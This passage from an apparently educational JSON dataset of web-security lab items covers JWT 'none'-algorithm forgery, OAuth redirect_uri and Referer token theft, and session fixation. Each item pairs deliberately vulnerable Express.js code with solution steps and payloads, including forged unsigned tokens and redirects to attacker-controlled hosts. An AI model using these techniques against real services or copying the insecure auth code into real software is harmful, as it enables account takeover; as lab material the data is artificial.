  ]
},
{
  "Lab scenario": "JWT algorithm tampering in GraphQL login",
  "Lab Description": "The application uses JWTs signed with HS256 but accepts unsigned JWTs due to improper algorithm checks. The login mutation accepts a token returned in the login response and trusts it without re-verification. To solve: manipulate the JWT's alg claim and gain access to Carlos's protected GraphQL data.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to send a GraphQL mutation and analyze the login response and token structure.",
    "Export the JWT and decode it. Modify the 'alg' header from HS256 to 'none'.",
    "Remove the signature and rebuild the token as a valid unsigned JWT.",
    "Replay the token in the Authorization header to access Carlos’s profile query.",
    "Confirm success by querying for Carlos’s email address using the modified token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const schema = require('./schema'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'secret', email: 'carlos@example.com' }]; app.post('/graphql', (req, res, next) => { if (req.body.query.includes('login')) { const { username, password } = req.body.variables; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ user: user.username }, 'supersecret', { algorithm: 'HS256' }); return res.json({ data: { login: token } }); } else return res.status(403).send('Invalid credentials'); } next(); }); app.use('/graphql', graphqlHTTP({ schema, graphiql: true })); app.listen(4000, () => console.log('JWT Tampering Lab running...'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"user\": \"carlos\" }",
    "Final token: base64(header).base64(payload).",
    "Authorization: Bearer [unsigned JWT]",
    "GraphQL query: { profile { email } }"
  ]
},
{
  "Lab scenario": "OAuth access token leakage in Referer header",
  "Lab Description": "The application integrates OAuth for login and redirects the user to a third-party site after authentication. However, the OAuth access token is included in the redirect URL, which is then leaked via the Referer header. To solve: intercept the leaked token from the Referer header and access Carlos's account.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Use Burp Suite to intercept the OAuth redirect after login and capture the Referer header sent to the third-party site.",
    "Note the presence of the access_token parameter in the Referer URL.",
    "Copy the leaked token and replay it in an Authorization header.",
    "Send GET /my-account with the Bearer token of Carlos.",
    "Confirm access to Carlos’s account and capture email from response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; res.redirect(`http://partner.com/landing?access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-oauth-token') res.send('Account: carlos, Email: carlos@example.com'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running...'));",
  "payloads": [
    "Captured token: access_token=carlos-oauth-token",
    "Authorization: Bearer carlos-oauth-token",
    "GET /my-account with captured token"
  ]
},
{
  "Lab scenario": "OAuth access token leakage in Referer header",
  "Lab Description": "The application integrates OAuth for login and redirects the user to a third-party site after authentication. However, the OAuth access token is included in the redirect URL, which is then leaked via the Referer header. To solve: intercept the leaked token from the Referer header and access Carlos's account.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Use Burp Suite to intercept the OAuth redirect after login and capture the Referer header sent to the third-party site.",
    "Note the presence of the access_token parameter in the Referer URL.",
    "Copy the leaked token and replay it in an Authorization header.",
    "Send GET /my-account with the Bearer token of Carlos.",
    "Confirm access to Carlos’s account and capture email from response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; res.redirect(`http://partner.com/landing?access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-oauth-token') res.send('Account: carlos, Email: carlos@example.com'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running...'));",
  "payloads": [
    "Captured token: access_token=carlos-oauth-token",
    "Authorization: Bearer carlos-oauth-token",
    "GET /my-account with captured token"
  ]
},
{
  "Lab scenario": "Session Fixation via SOAP login flow in Session Management",

  "Lab Description": "The application processes login sessions through a SOAP-based authentication handler. It fails to regenerate session identifiers upon successful login. The server accepts session IDs via the JSESSIONID cookie and binds them to accounts without invalidation. To solve: fixate a session ID before login and use it to hijack Carlos’s session post-authentication.",

  "Difficulty Level": "Easy",

  "Solution Steps": [
    "Use OWASP ZAP to intercept the initial unauthenticated SOAP request and extract the issued JSESSIONID.",
    "Send a crafted SOAP login request with Carlos’s credentials using Postman while preserving the previously obtained JSESSIONID.",
    "Use Burp Suite to replay the request and confirm session fixation by observing that the same JSESSIONID is still active after authentication.",
    "Switch to browser and inject the fixed session ID into cookies while visiting /my-account.",
    "Confirm access to Carlos’s account page using the hijacked session."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const soap = require('soap'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'soapsecret', resave: false, saveUninitialized: true })); app.use(bodyParser.text({ type: 'text/xml' })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/soap-login', (req, res) => { const xml = req.body; const match = xml.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Invalid request'); const [_, username, password] = match; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); req.session.user = user.username; console.log('[DEBUG] Session ID fixed:', req.sessionID); res.send(`<response><status>success</status></response>`); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running'));",

  "payloads": [
    "JSESSIONID=prelogin123",
    "<soapenv:Envelope><soapenv:Body><login><username>carlos</username><password>letmein</password></login></soapenv:Body></soapenv:Envelope>",
    "Cookie: JSESSIONID=prelogin123"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in Authorization header in Bearer Token Authentication",

  "Lab Description": "The API accepts JWT tokens using the Authorization header. It trusts the 'alg' field in the token without verifying if a valid signature is provided. This flaw allows switching from HS256 to 'none' algorithm, effectively bypassing signature validation. To solve: forge a token granting admin access and retrieve Carlos’s profile data.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "Use Postman to send an authenticated request and capture the original JWT from the Authorization header.",
    "Decode the JWT using jwt.io or Burp Decoder and observe the 'alg':'HS256' field.",
    "Create a forged JWT with 'alg':'none' and payload {\"user\":\"carlos\",\"role\":\"admin\"} using jwt.io or a Python script.",
    "Use Burp Suite to replace the Authorization header with the forged token and send it to /api/user/profile.",
    "Confirm unauthorized access by observing Carlos’s data in the response."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/api/user/profile', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'carlos' && payload.role === 'admin') return res.json({ profile: 'Carlos personal data' }); } return res.status(403).send('Unauthorized'); }); app.listen(4001, () => console.log('JWT Alg Confusion Lab running'));",

  "payloads": [
    "Authorization: Bearer <header: {\"alg\":\"none\"}, payload: {\"user\":\"carlos\",\"role\":\"admin\"}, signature: \"\" >",
    "curl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.' http://localhost:4001/api/user/profile"
  ]
},
{
  "Lab scenario": "OAuth 2.0 token leakage in redirect_uri parameter via Authorization Code Flow",

  "Lab Description": "The app uses OAuth 2.0 Authorization Code flow for third-party authentication. It fails to validate exact matching of redirect_uri during code-to-token exchange, enabling token hijacking by supplying a malicious redirect URI on callback. To solve: steal Carlos’s access token using an attacker-controlled domain.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "Use Burp Suite to capture the /authorize?client_id flow and note the registered redirect_uri.",
    "Change the redirect_uri to a malicious but similar-looking domain (e.g., attacker.com instead of trusted.com) in the initial authorization request.",
    "After Carlos logs in, the authorization server redirects the code to your malicious domain with the token in the URL.",
    "Extract the leaked token from your attacker server log or browser.",
    "Use Postman to access /account/details with the stolen token as Bearer to retrieve Carlos’s data."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const app = express(); const tokens = {}; const clients = [{ id: '123', redirect_uri: 'https://trusted.com/callback' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const client = clients.find(c => c.id === client_id); if (!client) return res.status(400).send('Unknown client'); // Incorrect matching logic if (!redirect_uri.includes(client.redirect_uri)) return res.status(400).send('Redirect mismatch'); const code = 'authcode123'; tokens[code] = { user: 'carlos', scope: 'read' }; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.get('/oauth/token', (req, res) => { const { code } = req.query; if (tokens[code]) return res.json({ access_token: 'leaked-token-for-carlos' }); res.status(400).send('Invalid code'); }); app.get('/account/details', (req, res) => { if (req.headers.authorization === 'Bearer leaked-token-for-carlos') res.send('Carlos private account details'); else res.status(403).send('Unauthorized'); }); app.listen(4002, () => console.log('OAuth Redirect Lab running'));",

  "payloads": [
    "GET /oauth/authorize?client_id=123&redirect_uri=https://attacker.com/callback&state=abc",
    "GET /oauth/token?code=authcode123",
    "Authorization: Bearer leaked-token-for-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation in REST login flow",

  "Lab Description": "This application improperly handles session identifiers during the login process. A fixed session cookie provided before authentication is retained after successful login. The application binds authenticated sessions to pre-login identifiers, allowing attackers to force users to authenticate into attacker-controlled sessions. To solve: hijack Carlos's session and access his account dashboard.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "1.Using Burp Suite, capture a GET /session request prior to logging in to observe the Set-Cookie header.",
    "2.Send the unauthenticated session ID to the victim via a crafted phishing page.",
    "3.Login to your own account and observe that your session ID changes upon successful login. Confirm mismatch.",
    "4.Use Burp to log in with the victim's credentials but force your controlled session ID via Burp's cookie editor.",
    "5.Access /dashboard using the fixed session and confirm access to Carlos's account."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; const users = [{ username: 'carlos', password: 's3cr3t' }]; app.get('/session', (req, res) => { const sid = 'sess-' + Math.random().toString(36).substring(2); sessions[sid] = null; res.cookie('sid', sid).send('Session created'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (!sid || !sessions[sid]) return res.status(400).send('Invalid session'); if (user) { sessions[sid] = username; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/dashboard', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username) res.send('Welcome to your dashboard, ' + username); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",

  "payloads": [
    "GET /session",
    "POST /login with Cookie: sid=sess-fixed",
    "Reuse sess-fixed after victim logs in",
    "GET /dashboard with forged session"
  ]
},
{
  "Lab scenario": "JWT None algorithm bypass in GraphQL login mutation",

  "Lab Description": "The GraphQL login mutation issues a JWT for session management but fails to enforce signature validation when the 'alg' header is set to 'none'. This misconfiguration allows an attacker to forge arbitrary tokens without knowing the secret key. To solve: forge a JWT for Carlos and access the /graphql me query.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1.Use Postman to send a login mutation and observe the signed JWT in the response.",
    "2.Decode the JWT and note the algorithm used in the header.",
    "3.Modify the header to 'alg': 'none' and create a payload with 'username': 'carlos'.",
    "4.Base64-encode the modified header and payload, concatenate with two dots, and remove the signature.",
    "5.Use Burp to send a POST /graphql query with the forged Authorization: Bearer token and verify the response from the 'me' query."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; const schema = require('graphql').buildSchema(` type Query { me: String } type Mutation { login(username: String!, password: String!): String } `); const root = { login: ({ username, password }) => { const user = users.find(u => u.username === username && u.password === password); if (!user) throw new Error('Invalid credentials'); return jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); }, me: (args, context) => { const token = context.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') return decoded.payload.username; try { const verified = jwt.verify(token, 'supersecret'); return verified.username; } catch (e) { return 'Unauthorized'; } } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, context: req, graphiql: true }))); app.listen(4000, () => console.log('JWT None Bypass Lab running at http://localhost:4000'));",

  "payloads": [
    "Header: { \"alg\": \"none\" }",
    "Payload: { \"username\": \"carlos\" }",
    "JWT: base64(header).base64(payload).",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration via open redirect",

  "Lab Description": "The OAuth flow implemented in the app allows open redirect on the 'redirect_uri' parameter during authorization, enabling attackers to capture tokens issued for other users. To solve: intercept the authorization code for Carlos by crafting a redirect to an attacker-controlled domain, then exchange it for a token and access Carlos's profile.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1.Initiate an OAuth login from the app and observe the authorization URL including the 'redirect_uri' parameter.",
    "2.Replace the 'redirect_uri' with your controlled domain (e.g., https://attacker.com/capture).",
    "3.Send the crafted link to Carlos. Upon clicking, Carlos's auth code will be sent to your domain.",
    "4.Exchange the stolen code for a token using the token endpoint.",
    "5.Use Postman to send a GET /profile request with Authorization: Bearer <access_token> and confirm it returns Carlos's data."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const axios = require('axios'); const users = [{ username: 'carlos', id: 123 }]; const client_id = 'client123'; const redirect_uris = ['https://attacker.com/capture']; app.get('/auth', (req, res) => { const { redirect_uri, state } = req.query; const code = 'authcode-carlos'; res.redirect(redirect_uri + '?code=' + code + '&state=' + state); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode-carlos') { res.json({ access_token: 'token-carlos', token_type: 'Bearer' }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.send('Profile: Carlos'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running at http://localhost:4000'));",

  "payloads": [
    "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com/capture&state=123",
    "POST /token { code: authcode-carlos }",
    "Authorization: Bearer token-carlos",
    "GET /profile"
  ]
},
{
  "Lab scenario": "Session Fixation in Login Flow",

  "Lab Description": "The application fails to invalidate pre-authentication session tokens during login. The application generates a session token upon initial visit and reuses it after login without regenerating it. This allows a malicious user to fix a session ID before the victim logs in. To solve: hijack Carlos's session by fixing a session ID before he authenticates and access his account page.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "1.Using Burp Suite, visit the login page and capture the Set-Cookie header that sets the initial session ID.",
    "2.Use OWASP ZAP to spider the login flow and confirm that the session token is preserved post-login.",
    "3.Share the crafted session ID with the victim (assume social engineering or CSRF vector).",
    "4.Wait for the victim (Carlos) to log in using the fixed session ID.",
    "5.Use the same session token to access /my-account and confirm access to Carlos’s account."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'fixedsession', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 's3cret' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Welcome to ${req.session.user}'s account`); } else { res.redirect('/login'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",

  "payloads": [
    "GET /login => Extract Set-Cookie: session=abc123",
    "Share session=abc123 with victim",
    "Victim logs in with session=abc123",
    "Reuse session=abc123 to GET /my-account"
  ]
},
{
  "Lab scenario": "JWT Tampering in Token Validation",

  "Lab Description": "The application's login API uses JWTs for authentication but fails to verify the token signature correctly when the 'alg' header is modified. The application accepts unsigned JWTs when the 'alg' is set to 'none'. To solve: tamper with a JWT to escalate privileges and access the admin panel.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1.Use Postman to log in and capture the issued JWT from the Authorization header.",
    "2.Decode the JWT using jwt.io or Burp Decoder. Note the payload and algorithm in the header.",
    "3.Modify the JWT header to set 'alg' to 'none' and set the 'role' in the payload to 'admin'.",
    "4.Remove the signature part and replay the modified token using Postman.",
    "5.Send a request to /admin-panel using the tampered JWT and verify admin access."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, 'secretkey'); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome Admin'); } const verified = jwt.verify(token, 'secretkey'); if (verified.role === 'admin') return res.send('Welcome Admin'); } catch (e) { return res.status(403).send('Access Denied'); } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",

  "payloads": [
    "Original JWT: eyJhbGciOiAiSFMyNTYifQ...signature",
    "Modified JWT: eyJhbGciOiAibm9uZSJ9.eyJ1c2VybmFtZSI6ICJjYXJsb3MiLCAicm9sZSI6ICJhZG1pbiJ9.",
    "Authorization: Bearer <tampered_token>",
    "GET /admin-panel"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Redirect URI Handling",

  "Lab Description": "The OAuth implementation does not properly validate the redirect URI, allowing attackers to manipulate the `redirect_uri` parameter to steal authorization codes. The authorization server reflects back the code to any domain containing the whitelisted base. To solve: steal Carlos's OAuth code via redirect hijack and log in as him.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1.Initiate OAuth login and observe the authorization request URL containing the redirect_uri parameter.",
    "2.Use Burp Suite to intercept and modify the redirect_uri to an attacker-controlled subdomain like https://evil.example.com/callback.",
    "3.Share the malicious link with the victim and get him to authenticate.",
    "4.The authorization server redirects with ?code=xyz to your malicious endpoint.",
    "5.Extract the code and perform the token exchange manually using Postman to obtain an access token.",
    "6.Use the token to access Carlos’s account via GET /graphql { user { profile } }"
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const app = express(); const fetch = require('node-fetch'); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; if (redirect_uri.includes('trusted.com')) { const code = 'abc123'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid redirect_uri'); } }); app.get('/oauth/token', (req, res) => { const { code } = req.query; if (code === 'abc123') { res.json({ access_token: 'carlos-token-xyz' }); } else { res.status(400).send('Invalid code'); } }); app.post('/graphql', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-token-xyz') res.json({ data: { user: { profile: 'Carlos\' profile data' } } }); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",

  "payloads": [
    "Original redirect_uri=https://trusted.com/callback",
    "Modified redirect_uri=https://evil.trusted.com/callback",
    "Stolen code=abc123 => POST /oauth/token?code=abc123 => { access_token: 'carlos-token-xyz' }",
    "Authorization: Bearer carlos-token-xyz => POST /graphql { user { profile } }"
  ]
},
{
  "Lab scenario": "JWT tampering in Bearer token authentication",
  "Lab Description": "The application uses stateless JWT-based Bearer tokens for user authentication and authorizes access based on the embedded role claim. The server does not validate the JWT signature properly. To solve: Forge a valid-looking token granting admin access and retrieve the flag from the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to log in with a valid user and retrieve the JWT from the Authorization header.",
    "Send the JWT to jwt.io and decode its payload. Observe the role is 'user'.",
    "Modify the 'role' claim to 'admin' and remove the signature part.",
    "Use Postman to craft a new Authorization header with the tampered JWT and send a GET request to /admin/dashboard.",
    "Verify access is granted without signature validation and retrieve the flag."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = 'notsosecret'; const users = [{ username: 'user1', password: 'pass123', role: 'user' }, { username: 'admin', password: 'adminpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, secret); res.send({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('No token'); const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Forbidden'); res.send('FLAG{jwt_admin_access}'); }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
  "payloads": [
    "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
    "Authorization: Bearer [tampered_jwt_here]",
    "POST /login {\"username\":\"user1\", \"password\":\"pass123\"}"
  ]
},
{
  "Lab scenario": "Session fixation in GraphQL login flow",
  "Lab Description": "The application uses GraphQL for authentication but fails to issue new session cookies on successful login, allowing session fixation. To solve: Fixate a session ID before login, then authenticate as a privileged user using that session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to send a GraphQL mutation login request and observe Set-Cookie behavior.",
    "Initiate a session anonymously and capture the session ID before login.",
    "Send a GraphQL login mutation with the victim's credentials while reusing the fixed session ID.",
    "Send a follow-up query to /graphql with the fixed session cookie and verify access to sensitive queries.",
    "Retrieve the admin email to confirm privilege escalation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'sessfix', resave: false, saveUninitialized: true })); const users = { admin: 'admin123', user: 'userpass' }; const schema = buildSchema(` type Query { profile: String } type Mutation { login(username: String!, password: String!): String } `); const root = { login: ({ username, password }, req) => { if (users[username] === password) { req.session.user = username; return 'Login successful'; } throw new Error('Invalid credentials'); }, profile: (args, req) => { if (req.session.user === 'admin') return 'Admin: FLAG{session_fixation}'; return 'Access Denied'; } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true }))); app.listen(4001, () => console.log('Session Fixation GraphQL Lab running'));",
  "payloads": [
    "POST /graphql {\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"admin123\\\") }\"}",
    "GET /graphql?query={profile} with fixed session cookie",
    "Cookie: connect.sid=[fixed_session_id]"
  ]
},
{
  "Lab scenario": "OAuth implicit flow misconfiguration leaking access tokens",
  "Lab Description": "The app uses OAuth 2.0 implicit grant for third-party login but exposes access tokens in the URL fragment (#) and reflects them in HTTP responses. To solve: Capture and replay a leaked token to access a protected resource.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to start a proxy and visit the login page using OAuth login.",
    "Capture the redirect URL with the access_token in the URL fragment.",
    "Notice the app reflects this fragment in a page script or DOM, making it accessible to JavaScript.",
    "Use Burp to modify the Referer header of a request to include the access_token and send to /user/info.",
    "Observe that the server accepts the token and returns user info or a flag."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/login/oauth/callback', (req, res) => { res.send(`<html><script>window.location.hash && document.write('Token: ' + window.location.hash);</script></html>`); }); app.get('/user/info', (req, res) => { const token = req.get('Authorization'); if (token === 'Bearer token_admin') return res.send('FLAG{oauth_leak_success}'); res.status(403).send('Access Denied'); }); app.listen(4002, () => console.log('OAuth Leak Lab running'));",
  "payloads": [
    "https://example.com/login/oauth/callback#access_token=token_admin",
    "GET /user/info with header Authorization: Bearer token_admin",
    "Referer: /callback#access_token=token_admin"
  ]
},
{
  "Lab scenario": "Session mismanagement in SOAP login API",
  "Lab Description": "This SOAP-based authentication system exposes session IDs in the SOAP response and accepts reused session tokens. To solve: Reuse an intercepted session ID from a privileged user to access their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite with SOAP support enabled and intercept a SOAP login request.",
    "Observe the session ID returned in the SOAP response under <SessionToken>.",
    "Reuse the <SessionToken> from a privileged login in a crafted SOAP request to getAccountDetails.",
    "Send the forged request using Burp Repeater and inspect the response.",
    "Confirm account access by retrieving sensitive account data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xml = require('xml'); const app = express(); app.use(bodyParser.text({ type: '*/xml' })); const sessions = {}; app.post('/soap', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (match) { const [_, user, pass] = match; if (user === 'admin' && pass === 'adminpass') { const session = 'sess-' + Math.random().toString(36).substring(2); sessions[session] = user; return res.send(`<SessionToken>${session}</SessionToken>`); } } if (req.body.includes('getAccountDetails')) { const sessionMatch = req.body.match(/<SessionToken>(.*?)<\\/SessionToken>/); if (sessionMatch && sessions[sessionMatch[1]] === 'admin') { return res.send('<data>FLAG{soap_session_reuse}</data>'); } } res.status(403).send('Unauthorized'); }); app.listen(4003, () => console.log('SOAP Session Reuse Lab running'));",
  "payloads": [
    "<login><username>admin</username><password>adminpass</password></login>",
    "<getAccountDetails><SessionToken>sess-abc123</SessionToken></getAccountDetails>",
    "POST /soap with reused <SessionToken>"
  ]
},
{
  "Lab scenario": "Session fixation in login redirect handler",
  "Lab Description": "The session token is assigned before user authentication and not regenerated upon login. This allows session fixation. The application reuses session tokens post-login, enabling an attacker to set a session for the victim. To solve: Fix a session ID and log in as Carlos to access his dashboard.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1.Using Burp Suite, visit /login and capture the Set-Cookie response header containing the session cookie.",
    "2.Send this session cookie to the victim (Carlos) through social engineering or place it in a link (session fixation).",
    "3.Log in as Carlos using his credentials while preserving the session cookie you fixed.",
    "4.The application reuses the fixed session without rotating it post-authentication.",
    "5.Use the session cookie to access /dashboard and verify Carlos’s user context."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret123', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/dashboard'); } else { res.status(401).send('Invalid login'); } }); app.get('/dashboard', (req, res) => { if (!req.session.user) return res.status(403).send('Unauthorized'); res.send(`Welcome, ${req.session.user}!`); }); app.listen(3000);",
  "payloads": [
    "https://vulnerable.site/login?sessionid=attacker-session",
    "GET /login HTTP/1.1 with Set-Cookie: session=fixme",
    "POST /login HTTP/1.1 with Cookie: session=fixme and body: username=carlos&password=letmein"
  ]
},
{
  "Lab scenario": "JWT authentication bypass using 'none' algorithm",
  "Lab Description": "The app uses JWTs for stateless authentication. It does not verify the algorithm used in the token header, allowing attackers to forge tokens by setting the alg field to 'none'. To solve: Access the protected /admin panel as user Carlos without a valid signature.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Use Burp to capture the JWT received after logging in as a normal user.",
    "2.Base64-decode the JWT header and payload.",
    "3.Modify the JWT header to: {\"alg\":\"none\"} and payload to: {\"user\":\"carlos\"}.",
    "4.Remove the signature portion and rejoin header and payload using a dot.",
    "5.Send a request to /admin with the forged JWT in Authorization: Bearer header. Confirm access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'topsecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, SECRET); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.sendStatus(401); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { return res.send(`Welcome Admin: ${decoded.payload.user}`); } const verified = jwt.verify(token, SECRET); res.send(`Welcome Admin: ${verified.user}`); } catch (err) { res.status(403).send('Access Denied'); } }); app.listen(3001);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"user\":\"carlos\"}",
    "JWT: base64url(header).base64url(payload). (omit signature)",
    "Authorization: Bearer base64(header).base64(payload)"
  ]
},
{
